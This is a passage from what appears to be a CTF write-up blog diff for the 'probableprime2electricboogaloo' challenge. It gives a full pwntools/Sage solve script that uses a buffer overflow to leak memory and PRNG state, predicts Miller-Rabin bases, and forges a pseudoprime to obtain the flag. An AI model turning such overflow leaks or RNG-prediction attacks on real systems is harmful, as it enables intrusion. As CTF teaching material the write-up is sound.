+    <span class="k">return</span> <span class="p">[</span><span class="n">urandomm_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds</span><span class="p">)]</span>
+    
+<span class="n">bases</span> <span class="o">=</span> <span class="n">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h5 id="generating-the-miller-rabin-pseudoprime">Generating the Miller-Rabin pseudoprime</h5>
+
+<p>With the bases, we can use the Prime-and-Prejudice attack against Miller-Rabin with some bases. Implementations exist online, for example from https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller_rabin.py in SageMath.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">N</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span> <span class="o">=</span> <span class="n">generate_pseudoprime</span><span class="p">(</span><span class="n">bases</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found pseudoprime N = </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 1 (p1) = </span><span class="si">{</span><span class="n">p1</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 2 (p2*p3) = </span><span class="si">{</span><span class="n">p2</span> <span class="o">*</span> <span class="n">p3</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After some waiting, the function returns a pseudoprime $N$ and factors $p_{1},p_{2},p_{3}$. By creating the prime and factoring it, we get our flag:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your prime: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span><span class="sa">b</span><span class="s">":iku:"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 1: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 2: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p2</span><span class="o">*</span><span class="n">p3</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1"># wack{7Hi5_7im3_wi7h_4_5i6n3d_c0mP3ri50N}
+</span></code></pre></div></div>
+
+<h5 id="solvesage">Solve.sage</h5>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># ======================== PWN ========================
+</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./probableprime2electricboogaloo"</span><span class="p">)</span>
+<span class="c1">#io = process("./probableprime2electricboogaloo")
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ctf.wackattack.eu"</span><span class="p">,</span> <span class="mi">8090</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create_prime</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">prime</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">name</span><span class="p">:</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Name: "</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"prime: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">prime</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">showcase_prime</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">opt</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">opt</span><span class="p">)</span>
+    <span class="n">leak1</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">leak2</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">leak1</span><span class="p">,</span> <span class="n">leak2</span>
+
+<span class="k">def</span> <span class="nf">edit_description</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak_add</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+    <span class="n">edit_description</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">name_leak</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">leaked_prefix</span> <span class="o">=</span> <span class="n">name_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">leaked_prefix</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">9</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">create_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"leak"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"13"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">57</span><span class="p">)</span>
+<span class="n">create_prime</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sa">b</span><span class="s">"11"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"asdf"</span><span class="p">)</span>
+<span class="n">prime</span><span class="p">,</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">desc</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">bss_leak</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
+<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bss_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x6150</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"PIE = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">k_addr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">k</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">k</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">k_addr</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"k = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">algdata_ptr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">st</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"algdata_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">algdata_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">x_ptr</span> <span class="o">=</span> <span class="n">algdata_ptr</span> <span class="o">+</span> <span class="mi">64</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"x_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">x_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="n">chunks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_add</span><span class="p">(</span><span class="n">x_ptr</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>
+
+<span class="n">Xbytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">Xbytes</span><span class="p">)</span>
+<span class="k">assert</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">Xbytes</span>
+<span class="n">X</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">Xbytes</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Leaked 1024-bit state X = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># ======================== CRYPTO ========================
+</span>
+<span class="n">A</span> <span class="o">=</span> <span class="mh">0x5851f42d4c957f2d</span>
+<span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">MASK1024</span>  <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">1024</span> <span class="o">-</span> <span class="mi">1</span>
+<span class="n">HALF_BITS</span> <span class="o">=</span> <span class="mi">512</span>
+<span class="n">HALF_MASK</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="n">HALF_BITS</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="k">class</span> <span class="nc">LCG1024</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>
+
+    <span class="k">def</span> <span class="nf">step</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="n">A</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">+</span> <span class="n">C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>
+
+    <span class="k">def</span> <span class="nf">high512</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">step</span><span class="p">()</span>
+        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">&gt;&gt;</span> <span class="n">HALF_BITS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">HALF_MASK</span>
+
+<span class="k">def</span> <span class="nf">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
+    <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">nbits</span> <span class="o">&lt;=</span> <span class="n">HALF_BITS</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">got</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
+        <span class="n">take</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">HALF_BITS</span><span class="p">,</span> <span class="n">nbits</span> <span class="o">-</span> <span class="n">got</span><span class="p">)</span>
+        <span class="n">out</span> <span class="o">|=</span> <span class="p">(</span><span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">take</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="n">got</span>
+        <span class="n">got</span> <span class="o">+=</span> <span class="n">take</span>
+        <span class="k">if</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
+            <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">out</span>
+
+<span class="k">def</span> <span class="nf">urandomm_mod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">63</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span>
+    <span class="n">nh</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">clz</span> <span class="o">=</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">nh</span><span class="p">.</span><span class="n">bit_length</span><span class="p">())</span> <span class="k">if</span> <span class="n">nh</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">64</span>
+    <span class="n">pow2</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">if</span> <span class="p">(</span><span class="n">nh</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">nh</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="k">else</span> <span class="mi">0</span>
+    <span class="n">nbits</span> <span class="o">=</span> <span class="n">size</span><span class="o">*</span><span class="mi">64</span> <span class="o">-</span> <span class="n">clz</span> <span class="o">-</span> <span class="n">pow2</span>
+    <span class="k">if</span> <span class="n">nbits</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">r</span>
+
+<span class="k">def</span> <span class="nf">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">rng</span> <span class="o">=</span> <span class="n">LCG1024</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">[</span><span class="n">urandomm_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds</span><span class="p">)]</span>
+
+<span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/shared/crt.py
+</span><span class="k">def</span> <span class="nf">fast_crt</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="n">segment_size</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
+    <span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">lcm</span>
+    <span class="s">"""
+    Uses a divide-and-conquer algorithm to compute the CRT remainder and least common multiple.
+    :param X: the remainders
+    :param M: the moduli (not necessarily coprime)
+    :param segment_size: the minimum size of the segments (default: 8)
+    :return: a tuple containing the remainder and the least common multiple
+    """</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">X_</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">M_</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">),</span> <span class="n">segment_size</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">X_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+                <span class="n">M_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">X_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">crt</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">segment_size</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">segment_size</span><span class="p">]))</span>
+                <span class="n">M_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">lcm</span><span class="p">(</span><span class="o">*</span><span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">segment_size</span><span class="p">]))</span>
+        <span class="n">X</span> <span class="o">=</span> <span class="n">X_</span>
+        <span class="n">M</span> <span class="o">=</span> <span class="n">M_</span>
+
+    <span class="k">return</span> <span class="n">X</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller_rabin.py
+# =========================================================================================
+</span><span class="k">def</span> <span class="nf">_generate_s</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
+    <span class="n">S</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
+        <span class="c1"># Possible non-residues mod 4a of potential primes p
+</span>        <span class="n">Sa</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">kronecker</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+                <span class="n">Sa</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+        <span class="c1"># Subsets of Sa that meet the intersection requirement
+</span>        <span class="n">Sk</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">ki</span> <span class="ow">in</span> <span class="n">k</span><span class="p">:</span>
+            <span class="k">assert</span> <span class="n">gcd</span><span class="p">(</span><span class="n">ki</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
+            <span class="n">Sk</span><span class="p">.</span><span class="n">append</span><span class="p">({</span><span class="nb">pow</span><span class="p">(</span><span class="n">ki</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">ki</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">Sa</span><span class="p">})</span>
+
+        <span class="n">S</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">Sa</span><span class="p">.</span><span class="n">intersection</span><span class="p">(</span><span class="o">*</span><span class="n">Sk</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">S</span>
+
+<span class="k">def</span> <span class="nf">_backtrack</span><span class="p">(</span><span class="n">S</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">S</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">fast_crt</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+
+    <span class="n">M</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+    <span class="k">for</span> <span class="n">za</span> <span class="ow">in</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
